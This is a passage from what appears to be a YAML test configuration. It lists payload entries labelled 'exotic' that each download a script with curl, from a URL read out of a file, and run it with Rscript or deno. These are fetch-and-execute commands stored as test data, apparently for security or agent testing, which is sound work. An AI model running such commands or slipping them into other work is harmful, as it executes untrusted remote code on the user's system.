  id: 007-exotic-julia
- vars:
    payload: |2
        curl -fsSL -o stage.R "$(cat "$srcdir/url.txt")"
        Rscript stage.R
  id: 008-exotic-Rscript
- vars:
    payload: |2
        curl -fsSL -o stage.ts "$(cat "$srcdir/url.txt")"
        deno stage.ts
